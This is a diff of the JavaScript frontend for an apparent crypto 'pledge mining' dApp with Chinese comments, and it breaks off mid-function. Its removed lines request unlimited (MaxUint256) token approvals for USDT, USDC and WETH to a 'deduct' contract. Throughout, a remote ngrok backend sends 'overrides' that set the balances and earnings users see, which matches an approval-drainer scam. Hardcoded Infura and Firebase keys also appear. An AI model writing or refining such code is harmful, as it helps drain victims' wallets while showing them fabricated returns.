@@ -1,8 +1,10 @@
 // ==================== 後端 API URL (您的 ngrok) ====================
 const BACKEND_API_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
 console.log('[DEBUG] BACKEND_API_URL 初始化:', BACKEND_API_URL);
+
 // ==================== Infura 備用節點 ====================
 const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
+
 // ==================== SSE 替代 WebSocket ====================
 let eventSource;
 function initSSE() {
@@ -120,6 +122,7 @@ function initSSE() {
     setTimeout(initSSE, 5000);
   };
 }
+
 // ==================== Firebase 初始化 ====================
 const app = window.firebase.initializeApp({
   apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
@@ -131,6 +134,7 @@ const app = window.firebase.initializeApp({
 });
 const db = window.firebase.firestore();
 console.log('[DEBUG] Firebase 初始化完成');
+
 // ==================== 合約地址與 ABI ====================
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
@@ -164,6 +168,7 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
+
 // ==================== 質押週期 ====================
 const PLEDGE_DURATIONS = [
   { days: 30, rate: 0.05, min: 1 },
@@ -173,6 +178,7 @@ const PLEDGE_DURATIONS = [
   { days: 240, rate: 0.281, min: 1 },
   { days: 365, rate: 0.315, min: 1 }
 ];
+
 // ==================== DOM 元素 ====================
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
 let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
@@ -182,6 +188,7 @@ let totalPledgeBlock, estimateBlock, pledgeDetailModal, closePledgeDetail;
 let accountDetailModal, closeAccountDetail, closeAccountDetailBtn;
 let elements = {};
 let rulesModal;
+
 // ==================== 全域變數 ====================
 let dataVersion = 0;
 let provider, signer, userAddress;
@@ -207,8 +214,10 @@ let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 let userPledges = [];
 window.isDemoMode = false;
 let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
+
 // ==================== 價格快取 ====================
 let tokenPrices = { USDT: 1, USDC: 1, WETH: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
+
 // ==================== 獲取代幣 USD 價格 ====================
 async function getTokenPriceUSD(token) {
   const now = Date.now();
@@ -229,6 +238,7 @@ async function getTokenPriceUSD(token) {
     return token === 'WETH' ? 2500 : 1;
   }
 }
+
 // ==================== 翻譯表 ====================
 const translations = {
   'en': {
@@ -466,6 +476,7 @@ const translations = {
     claimPledgeSuccess: '领取成功！'
   }
 };
+
 // ==================== 語言防呆（修復版）===================
 let currentLang = 'en';
 const urlParams = new URLSearchParams(window.location.search);
@@ -480,18 +491,21 @@ if (langFromUrl && translations[langFromUrl]) {
 }
 document.documentElement.lang = currentLang;
 localStorage.setItem('language', currentLang);
+
 // ==================== 安全數字格式化 ====================
 function safeFixed(value, decimals = 3) {
   const num = parseFloat(value);
   return isNaN(num) ? '0.000' : num.toFixed(decimals);
 }
+
 // ==================== 防 XSS 轉義 ====================
 function escapeHtml(text) {
   const div = document.createElement('div');
   div.textContent = text;
   return div.innerHTML;
 }
-// ==================== 狀態更新函數（全部改為英文鍵）===================
+
+// ==================== 狀態更新函數 ====================
 function updateStatus(messageKey, isWarning = false) {
   const messages = {
     miningActivated: 'Mining activated, ready to pledge',
@@ -513,6 +527,7 @@ function updateStatus(messageKey, isWarning = false) {
   statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
   statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
 }
+
 // ==================== 重置狀態 ====================
 function resetState(showMsg = true) {
   signer = userAddress = null;
@@ -537,7 +552,7 @@ function resetState(showMsg = true) {
   }
   if (connectButton) {
     connectButton.classList.remove('connected');
-    connectButton.textContent = 'Connect';
+    connectButton.textContent = translations[currentLang].noWallet || 'Connect Wallet';
   }
   disableInteractiveElements(true);
   if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
@@ -550,6 +565,7 @@ function resetState(showMsg = true) {
   if (elements.exceedWarning) elements.exceedWarning.style.display = 'none';
   if (showMsg) updateStatus("noWallet", true);
 }
+
 // ==================== 禁用互動元素 ====================
 function disableInteractiveElements(disable = false) {
   if (startBtn) startBtn.disabled = disable;
@@ -559,6 +575,7 @@ function disableInteractiveElements(disable = false) {
   if (pledgeToken) pledgeToken.disabled = disable;
   if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
 }
+
 // ==================== 獲取 DOM 元素 ====================
 function getElements() {
   connectButton = document.getElementById('connectButton');
@@ -618,6 +635,7 @@ function getElements() {
     modalWalletBalanceLabel: document.getElementById('modalWalletBalanceLabel')
   };
 }
+
 // ==================== 綁定 ? 按鈕 ====================
 function bindRulesButton() {
   const rulesModal = document.getElementById('rulesModal');
@@ -648,7 +666,8 @@ function bindRulesButton() {
   });
   console.log('[DEBUG] ? 按鈕事件綁定成功');
 }
-// ==================== 更新帳戶餘額顯示（已修復）===================
+
+// ==================== 更新帳戶餘額顯示 ====================
 function getTotalAccountBalanceInSelectedToken() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const data = accountBalance[selected];
@@ -661,6 +680,7 @@ function updateAccountBalanceDisplay() {
   const total = getTotalAccountBalanceInSelectedToken();
   accountBalanceValue.textContent = `${safeFixed(total)} ${selected}`;
 }
+
 // ==================== 從快取更新錢包餘額 ====================
 function updateWalletBalanceFromCache() {
   if (!walletTokenSelect || !walletBalanceAmount) return;
@@ -672,6 +692,7 @@ function updateWalletBalanceFromCache() {
   accountBalance[selected].wallet = value;
   walletBalanceAmount.textContent = safeFixed(value);
 }
+
 // ==================== 強制刷新錢包餘額 ====================
 async function forceRefreshWalletBalance() {
   if (!userAddress || window.isDemoMode) return;
@@ -683,11 +704,6 @@ async function forceRefreshWalletBalance() {
       wethContract.connect(provider).balanceOf(userAddress)
     ]);
     cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
-    console.log('[DEBUG] 餘額刷新結果:', {
-      USDT: ethers.formatUnits(usdtBal, 6),
-      USDC: ethers.formatUnits(usdcBal, 6),
-      WETH: ethers.formatEther(wethBal)
-    });
     updateWalletBalanceFromCache();
     updateAccountBalanceDisplay();
     updateEstimate();
@@ -696,7 +712,8 @@ async function forceRefreshWalletBalance() {
     updateStatus(`Balance read failed: ${error.message}`, true);
   }
 }
-// ==================== 【修復】應用 overrides ====================
+
+// ==================== 應用 overrides ====================
 function applyOverrides(override) {
   window.currentClaimable = override.cumulative ?? 0;
   totalGrossOutput = override.grossOutput ?? 0;
@@ -705,17 +722,10 @@ function applyOverrides(override) {
     const interestKey = `interest${token}`;
     const claimedKey = `claimedInterest${token}`;
     const walletKey = `wallet${token}`;
-    if (override[pledgedKey] != null) {
-      accountBalance[token].pledged = Number(override[pledgedKey]);
-    }
-    if (override[interestKey] != null) {
-      accountBalance[token].interest = Number(override[interestKey]);
-    }
-    if (override[claimedKey] != null) {
-      localStorage.setItem(claimedKey, String(override[claimedKey]));
-    } else {
-      localStorage.setItem(claimedKey, '0');
-    }
+    if (override[pledgedKey] != null) accountBalance[token].pledged = Number(override[pledgedKey]);
+    if (override[interestKey] != null) accountBalance[token].interest = Number(override[interestKey]);
+    if (override[claimedKey] != null) localStorage.setItem(claimedKey, String(override[claimedKey]));
+    else localStorage.setItem(claimedKey, '0');
     if (override[walletKey] != null) {
       accountBalance[token].wallet = Number(override[walletKey]);
       updateWalletBalanceFromCache();
@@ -724,7 +734,8 @@ function applyOverrides(override) {
   updateClaimableDisplay();
   updateAccountBalanceDisplay();
 }
-// ==================== 其他函數保持不變 ====================
+
+// ==================== 其他函數 ====================
 function getCurrentBalances() {
   return {
     USDT: accountBalance.USDT.wallet,
@@ -771,27 +782,18 @@ function getETOffsetMilliseconds() {
 }
 function updateClaimableDisplay() {
   if (!grossOutputValue || !cumulativeValue) return;
-  const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] ||
-                          window.loadedUserData ||
-                          {};
-  const currentOverrides = window.currentOverrides ||
-                          (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
-  const grossOutput = currentOverrides.grossOutput !== undefined
-      ? currentOverrides.grossOutput
-      : (currentUserData.grossOutput || totalGrossOutput || 0);
+  const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] || window.loadedUserData || {};
+  const currentOverrides = window.currentOverrides || (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
+  const grossOutput = currentOverrides.grossOutput !== undefined ? currentOverrides.grossOutput : (currentUserData.grossOutput || totalGrossOutput || 0);
   grossOutputValue.textContent = `${safeFixed(grossOutput, 7)} ETH`;
-  const cumulative = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0
-      ? currentOverrides.cumulative
-      : (currentUserData.cumulative || window.currentClaimable || 0);
+  const cumulative = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0 ? currentOverrides.cumulative : (currentUserData.cumulative || window.currentClaimable || 0);
   cumulativeValue.textContent = `${safeFixed(cumulative, 7)} ETH`;
 }
 async function updateInterest() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const data = accountBalance[selected];
   const totalBalance = data.wallet + data.pledged;
-  const hasOverride = window.currentOverrides?.cumulative !== undefined ||
-                     (window.lastSseData?.overrides?.[userAddress?.toLowerCase()]?.cumulative !== undefined) ||
-                     window.currentOverrides || window.lastSseData?.overrides?.[userAddress?.toLowerCase()];
+  const hasOverride = window.currentOverrides?.cumulative !== undefined || (window.lastSseData?.overrides?.[userAddress?.toLowerCase()]?.cumulative !== undefined);
   if (hasOverride) return;
   if (totalBalance <= 0) {
     window.currentClaimable = 0;
@@ -834,14 +836,9 @@ function updateClaimModalLabels() {
 async function claimInterest() {
   await refreshEthPrice();
   updateClaimModalLabels();
-  const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] ||
-                          window.loadedUserData ||
-                          {};
-  const currentOverrides = window.currentOverrides ||
-                          (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
-  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0
-      ? currentOverrides.cumulative
-      : (currentUserData.cumulative || window.currentClaimable || 0);
+  const currentUserData = window.lastSseData?.users?.[userAddress?.toLowerCase()] || window.loadedUserData || {};
+  const currentOverrides = window.currentOverrides || (window.lastSseData?.overrides?.[userAddress?.toLowerCase()] || {});
+  const claimableETH = currentOverrides.cumulative !== undefined && currentOverrides.cumulative > 0 ? currentOverrides.cumulative : (currentUserData.cumulative || window.currentClaimable || 0);
   if (modalClaimableETH) modalClaimableETH.textContent = `${safeFixed(claimableETH, 7)} ETH`;
   if (modalSelectedToken) modalSelectedToken.textContent = authorizedToken;
   const ethPrice = ethPriceCache.price || 2500;
@@ -924,75 +921,72 @@ async function sendMobileRobustTransaction(populatedTx) {
   if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
   return receipt;
 }
+
+// ==================== 初始化錢包（修復自動連接）===================
 async function initializeWallet() {
-  if (!window.ethers) {
-    updateStatus(translations[currentLang].ethersError, true);
-    if (connectButton) connectButton.disabled = true;
+  if (!window.ethers || !window.ethereum) {
+    setTimeout(initializeWallet, 500);
     return;
   }
   try {
     console.log('[DEBUG] 初始化錢包...');
-    if (typeof window.ethereum !== 'undefined') {
-      provider = new window.ethers.BrowserProvider(window.ethereum);
-    } else {
-      provider = new window.ethers.JsonRpcProvider(INFURA_URL);
-      updateStatus('Please connect wallet to transact', true);
-    }
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', a => {
-        if (a.length === 0) disconnectWallet();
-        else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
-          resetState(false);
-          setTimeout(connectWallet, 500);
-        }
-      });
-      window.ethereum.on('chainChanged', () => {
+    provider = new ethers.BrowserProvider(window.ethereum);
+
+    window.ethereum.on('accountsChanged', a => {
+      if (a.length === 0) resetState(true);
+      else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
         resetState(false);
         setTimeout(connectWallet, 500);
-      });
-    }
+      }
+    });
+    window.ethereum.on('chainChanged', () => location.reload());
+
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
-      console.log('[DEBUG] 自動連線錢包');
-      await connectWallet(); // 自動連接
+      console.log('[DEBUG] 自動連接錢包:', accounts[0]);
+      userAddress = accounts[0];
+      signer = await provider.getSigner();
+      await setupContracts();
+      if (connectButton) {
+        connectButton.classList.add('connected');
+        connectButton.textContent = 'Connected';
+      }
+      await forceRefreshWalletBalance();
+      updateStatus("walletConnected");
+      await loadUserDataFromServer();
       await updateUIBasedOnChainState();
+      initSSE();
     } else {
       disableInteractiveElements(true);
       updateStatus("noWallet", true);
-      if (connectButton) connectButton.textContent = 'Connect wallet';
+      if (connectButton) connectButton.textContent = translations[currentLang].noWallet || 'Connect Wallet';
     }
   } catch (e) {
     console.error('[DEBUG] 錢包初始化錯誤:', e);
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
-    if (connectButton) connectButton.disabled = true;
   }
 }
+
+// ==================== 合約初始化 ====================
+async function setupContracts() {
+  deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
+  usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
+  usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
+  wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+}
+
+// ==================== 連接錢包 ====================
 let isConnecting = false;
 async function connectWallet() {
-  if (isConnecting) {
-    updateStatus('Wallet connection request in progress, please wait...', true);
-    return;
-  }
+  if (isConnecting) return;
   isConnecting = true;
   try {
-    console.log('[DEBUG] 開始錢包連線...');
-    if (typeof window.ethereum === 'undefined') {
-      updateStatus('Please connect a wallet that supports EIP-1193', true);
-      return;
-    }
-    if (!provider) {
-      provider = new window.ethers.BrowserProvider(window.ethereum);
-    }
-    updateStatus('Connecting...');
+    if (!window.ethereum) throw new Error("No wallet");
     const accounts = await provider.send('eth_requestAccounts', []);
-    if (accounts.length === 0) throw new Error("No account.");
+    if (!accounts.length) throw new Error("No account");
+    userAddress = accounts[0];
     signer = await provider.getSigner();
-    userAddress = await signer.getAddress();
-    console.log('[DEBUG] 錢包連線成功:', userAddress);
-    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-    usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-    usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
-    wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+    await setupContracts();
     if (connectButton) {
       connectButton.classList.add('connected');
       connectButton.textContent = 'Connected';
@@ -1002,25 +996,19 @@ async function connectWallet() {
     await loadUserDataFromServer();
     await updateUIBasedOnChainState();
     initSSE();
-    setTimeout(() => updateUIBasedOnChainState(), 3000);
   } catch (e) {
-    console.error('[DEBUG] 錢包連線失敗:', e);
-    if (e.code === -32002 || e.message.includes('already pending')) {
-      updateStatus('Wallet confirmation window is open, please confirm in wallet', true);
-    } else {
-      updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
-      resetState(true);
-    }
+    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
   } finally {
     isConnecting = false;
   }
 }
+
+// ==================== 鏈上狀態檢查 ====================
 async function updateUIBasedOnChainState() {
   if (!userAddress) return;
   try {
-    console.log('[DEBUG] 開始鏈上狀態檢查...');
     await provider.getBlockNumber();
-    const isServiceActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
+    const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
     if (isServiceActive) {
       if (startBtn) startBtn.style.display = 'none';
       disableInteractiveElements(false);
@@ -1038,59 +1026,8 @@ async function updateUIBasedOnChainState() {
     updateStatus(`Status check error: ${e.message}`, true);
   }
 }
-async function handleConditionalAuthorizationFlow() {
-  if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
-  updateStatus('Authorizing...');
-  const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
-  const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
-  const tokenMap = {
-    'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
-    'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
-    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
-  };
-  const tokensToProcess = Object.values(tokenMap);
-  let tokenToActivate = '';
-  for (const { name, contract, address } of tokensToProcess) {
-    if (!contract) continue;
-    updateStatus(`Checking ${name} allowance...`);
-    const currentAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
-    if (currentAllowance < requiredAllowance) {
-      updateStatus(`Requesting ${name} approval...`);
-      try {
-        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        approvalTx.value = 0n;
-        await sendMobileRobustTransaction(approvalTx);
-        const newAllowance = await retry(() => contract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
-        if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
-      } catch (err) {
-        updateStatus(`${translations[currentLang].approveError} (${name})`, true);
-      }
-    } else if (!tokenToActivate) tokenToActivate = address;
-  }
-  if (!serviceActivated && tokenToActivate) {
-    const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-    updateStatus(`Activating service with ${tokenName}...`);
-    try {
-      const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
-      activateTx.value = 0n;
-      const receipt = await sendMobileRobustTransaction(activateTx);
-      if (receipt.status !== 1) throw new Error('Activation failed on chain');
-      authorizedToken = tokenName;
-      localStorage.setItem('authorizedToken', authorizedToken);
-      await smartSave();
-      await updateUIBasedOnChainState();
-    } catch (err) {
-      throw err;
-    }
-  }
-  await forceRefreshWalletBalance();
-  await loadUserDataFromServer();
-  await updateUIBasedOnChainState();
-  pledgeBtn.disabled = false;
-  pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-  updateStatus("authSuccess");
-}
+
+// ==================== 更新語言（修復版）===================
 function updateLanguage(lang) {
   if (!translations[lang]) lang = 'en';
   currentLang = lang;
@@ -1099,41 +1036,30 @@ function updateLanguage(lang) {
   if (languageSelect) languageSelect.value = lang;
 
   const apply = () => {
+    getElements(); // 強制更新
     for (let key in elements) {
       if (elements[key] && translations[lang]?.[key]) {
         elements[key].textContent = translations[lang][key];
       }
     }
-    const rulesTitle = document.getElementById('rulesTitle');
-    const rulesContent = document.getElementById('rulesContent');
-    if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
-    if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;
-
+    if (startBtn) startBtn.textContent = translations[lang].startBtnText;
+    if (pledgeBtn) pledgeBtn.textContent = translations[lang].pledgeBtnText;
+    if (connectButton && !userAddress) connectButton.textContent = translations[lang].noWallet || 'Connect Wallet';
     updateNextBenefitTimer();
     updatePledgeSummary();
     updateEstimate();
-
-    // 強制更新按鈕
-    if (startBtn) startBtn.textContent = translations[lang].startBtnText;
-    if (pledgeBtn) pledgeBtn.textContent = translations[lang].pledgeBtnText;
-
-    // 更新帳戶明細標籤
-    const labelMap = {
-      modalTotalBalanceLabel: 'totalBalance',
-      modalPledgedAmountLabel: 'pledgedAmount',
-      modalPendingInterestLabel: 'pendingInterest',
-      modalClaimedInterestLabel: 'claimedInterest',
-      modalWalletBalanceLabel: 'walletBalance',
-      totalPledgeLabel: 'totalPledge',
-      estimateLabel: 'estimate'
-    };
-    Object.keys(labelMap).forEach(id => {
-      const el = document.getElementById(id);
-      if (el) el.textContent = translations[lang][labelMap[id]];
+    updateClaimableDisplay();
+    updateAccountBalanceDisplay();
+    const labels = ['totalBalance', 'pledgedAmount', 'pendingInterest', 'claimedInterest', 'walletBalance', 'totalPledge', 'estimate'];
+    labels.forEach(key => {
+      const el = document.getElementById(`modal${key.charAt(0).toUpperCase() + key.slice(1)}Label`) || document.getElementById(`${key}Label`);
+      if (el && translations[lang][key]) el.textContent = translations[lang][key];
     });
   };
-  setTimeout(apply, 50);
+  setTimeout(apply, 100);
 }
+
+// ==================== 其他功能函數 ====================
 function calculatePayoutInterest() {
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const data = accountBalance[selected];
@@ -1185,152 +1111,8 @@ function updateEstimate() {
     elements.exceedWarning.style.display = 'none';
   }
 }
-// ==================== 雙層訂單詳情（動態翻譯） ====================
-function showPledgeDetail() {
-  if (!pledgeDetailModal) return;
-  const content = document.getElementById('pledgeDetailContent');
-  if (!content) return;
-  content.innerHTML = '';
-  if (userPledges.length === 0) {
-    content.innerHTML = `<p>${translations[currentLang].noClaimable}</p>`;
-  } else {
-    const list = document.createElement('div');
-    userPledges.forEach((p, i) => {
-      const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
-      const daysLeft = Math.max(0, Math.ceil((endTime - Date.now()) / (24 * 60 * 60 * 1000)));
-      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
-      const apr = (durationInfo.rate * 100).toFixed(1) + '%';
-      const estimatedInterest = (p.amount * durationInfo.rate).toFixed(3);
-      const item = document.createElement('div');
-      item.style = 'border: 1px solid #444; margin: 8px 0; padding: 12px; border-radius: 8px; cursor: pointer; background: #1a1a1a;';
-      item.innerHTML = `
-        <div style="font-weight: bold;">${translations[currentLang].orderCount} #${i+1} - ${safeFixed(p.amount)} ${escapeHtml(p.token)}</div>
-        <div style="font-size: 0.9em; color: #0f0;">${translations[currentLang].cycle}：${p.duration} ${translations[currentLang].days} | ${translations[currentLang].apr}：${apr}</div>
-        <div style="font-size: 0.9em; color: #0ff;">${translations[currentLang].remaining}：${daysLeft} ${translations[currentLang].days} | ${translations[currentLang].accrued}：${estimatedInterest} ${escapeHtml(p.token)}</div>
-        <div style="font-size: 0.8em; color: #aaa; margin-top: 4px;">${new Date(p.startTime).toLocaleString()}</div>
-      `;
-      item.onclick = () => showOrderDetail(p, i);
-      list.appendChild(item);
-    });
-    content.appendChild(list);
-  }
-  pledgeDetailModal.style.display = 'flex';
-}
-// 【關鍵修復】使用 DOM 操作 + addEventListener，避免 innerHTML 注入 onclick
-function showOrderDetail(order, index) {
-  const detailModal = document.createElement('div');
-  detailModal.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px;';
-  const endTime = order.startTime + order.duration * 24 * 60 * 60 * 1000;
-  const daysLeft = Math.max(0, Math.ceil((endTime - Date.now()) / (24 * 60 * 60 * 1000)));
-  const durationInfo = PLEDGE_DURATIONS.find(d => d.days === order.duration) || { rate: 0 };
-  const accrued = (order.amount * durationInfo.rate * (Date.now() - order.startTime) / (order.duration * 24 * 60 * 60 * 1000)).toFixed(3);
-  const estimatedTotal = (order.amount * durationInfo.rate).toFixed(3);
-  const modalContent = document.createElement('div');
-  modalContent.style = 'background: #111; padding: 24px; border-radius: 16px; max-width: 90%; color: #fff; box-shadow: 0 0 20px rgba(0,255,255,0.3);';
-  modalContent.innerHTML = `
-    <h3 style="margin: 0 0 16px; color: #0ff;">${translations[currentLang].pledgeDetailTitle} #${index + 1}</h3>
-    <div style="line-height: 1.6;">
-      <p><strong>${translations[currentLang].orderCount}：</strong><span style="color:#0f0;">${escapeHtml(order.orderId)}</span></p>
-      <p><strong>${translations[currentLang].pledgedAmount}：</strong>${safeFixed(order.amount)} ${escapeHtml(order.token)}</p>
-      <p><strong>${translations[currentLang].cycle}：</strong>${order.duration} ${translations[currentLang].days}</p>
-      <p><strong>${translations[currentLang].apr}：</strong><span style="color:#0f0;">${(durationInfo.rate * 100).toFixed(1)}%</span></p>
-      <p><strong>${translations[currentLang].startTime}：</strong>${new Date(order.startTime).toLocaleString()}</p>
-      <p><strong>End Time：</strong>${new Date(endTime).toLocaleString()}</p>
-      <p><strong>${translations[currentLang].remaining}：</strong><span style="color:#ff0;">${daysLeft} ${translations[currentLang].days}</span></p>
-      <p><strong>${translations[currentLang].accrued}：</strong><span style="color:#0ff;">${accrued} ${escapeHtml(order.token)}</span></p>
-      <p><strong>Estimated Total Interest：</strong><span style="color:#0f0;">${estimatedTotal} ${escapeHtml(order.token)}</span></p>
-    </div>
-  `;
-  const closeBtn = document.createElement('button');
-  closeBtn.textContent = 'Close';
-  closeBtn.style = 'margin-top: 20px; padding: 10px 20px; background: #00ffff; color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;';
-  closeBtn.onclick = () => detailModal.remove();
-  modalContent.appendChild(closeBtn);
-  detailModal.appendChild(modalContent);
-  document.body.appendChild(detailModal);
-  detailModal.addEventListener('click', (e) => {
-    if (e.target === detailModal) detailModal.remove();
-  });
-}
-// ==================== 帳戶明細（點擊 Pending Interest 領取） ====================
-function showAccountDetail() {
-  if (!accountDetailModal) return;
-  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-  const data = accountBalance[selected];
-  const claimedInterest = parseFloat(localStorage.getItem(`claimedInterest${selected}`) || '0') || 0;
-  const total = (data.wallet || 0) + (data.pledged || 0) + claimedInterest + (data.interest || 0);
-  document.getElementById('modalTotalBalance').textContent = `${safeFixed(total)} ${selected}`;
-  document.getElementById('modalPledgedAmount').textContent = `${safeFixed(data.pledged || 0)} ${selected}`;
-  document.getElementById('modalPendingInterest').textContent = `${safeFixed(data.interest || 0)} ${selected}`;
-  document.getElementById('modalClaimedInterest').textContent = `${safeFixed(claimedInterest)} ${selected}`;
-  document.getElementById('modalWalletBalance').textContent = `${safeFixed(data.wallet || 0)} ${selected}`;
-  accountDetailModal.style.display = 'flex';
-  // 強制更新語言標籤
-  const pendingLabel = document.getElementById('modalPendingInterestLabel');
-  const claimedLabel = document.getElementById('modalClaimedInterestLabel');
-  if (pendingLabel) pendingLabel.textContent = translations[currentLang].pendingInterest;
-  if (claimedLabel) claimedLabel.textContent = translations[currentLang].claimedInterest;
-  // 點擊 Pending Interest 跳出領取面板
-  const pendingRow = document.getElementById('modalPendingInterest').parentElement;
-  pendingRow.style.cursor = 'pointer';
-  pendingRow.onclick = () => {
-    if (data.pledged + data.interest <= 0) {
-      updateStatus('No principal or interest to claim', true);
-      return;
-    }
-    showPledgeResult('confirm', translations[currentLang].claimPledgeTitle,
-      `${translations[currentLang].claimPledgeMessage}<br>` +
-      `<strong>Principal:</strong> ${safeFixed(data.pledged)} ${selected}<br>` +
-      `<strong>Interest:</strong> ${safeFixed(data.interest)} ${selected}<br>` +
-      `<small style="color:#aaa;">${translations[currentLang].confirm} to move to Claimed Interest</small>`,
-      () => confirmClaimInterest(selected) // 確認回調
-    );
-  };
-}
-function closeAccountDetailModal() {
-  if (accountDetailModal) accountDetailModal.style.display = 'none';
-}
-// 確認領取本金 + 利息
-function confirmClaimInterest(token) {
-  const data = accountBalance[token];
-  const total = data.pledged + data.interest;
-  if (total <= 0) return;
-  const claimedKey = `claimedInterest${token}`;
-  const previous = parseFloat(localStorage.getItem(claimedKey) || '0');
-  localStorage.setItem(claimedKey, (previous + total).toString());
-  data.pledged = 0;
-  data.interest = 0;
-  updateAccountBalanceDisplay();
-  showPledgeResult('success', translations[currentLang].claimPledgeSuccess,
-    `${safeFixed(total)} ${token} ${translations[currentLang].claimPledgeSuccess}`
-  );
-  smartSave();
-}
-// ==================== 【新增】到期自動贖回 + 通知 ====================
-function checkPledgeExpiry() {
-  userPledges.forEach(async (p, i) => {
-    const endTime = p.startTime + p.duration * 24 * 60 * 60 * 1000;
-    if (Date.now() > endTime && !p.redeemed) {
-      p.redeemed = true;
-      const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
-      const totalInterest = p.amount * durationInfo.rate;
-      accountBalance[p.token].pledged -= p.amount;
-      accountBalance[p.token].interest += totalInterest;
-      p.redeemedTime = Date.now();
-      await smartSave();
-      updateAccountBalanceDisplay();
-      updatePledgeSummary();
-      updateClaimableDisplay();
-      showPledgeResult('success', translations[currentLang].pledgeMatured,
-        `${p.amount.toFixed(3)} ${p.token} ${translations[currentLang].principalReturned}<br>` +
-        `${totalInterest.toFixed(3)} ${p.token} ${translations[currentLang].interestAdded}<br>` +
-        `<small style="color:#aaa;">${translations[currentLang].viewDetails}</small>`
-      );
-    }
-  });
-}
-setInterval(checkPledgeExpiry, 60000);
-// ==================== 【修復】顯示質押結果面板 ====================
+
+// ==================== 顯示質押結果面板 ====================
 function showPledgeResult(type, title, message, confirmCallback = null) {
   const modal = document.getElementById('pledgeResultModal');
   const titleEl = document.getElementById('pledgeResultTitle');
@@ -1354,19 +1136,33 @@ function showPledgeResult(type, title, message, confirmCallback = null) {
     confirmBtn.onclick = () => modal.style.display = 'none';
   }
 }
-// 檢查質押是否被鎖定（後端處理中）
-async function isPledgeLocked(address) {
-  try {
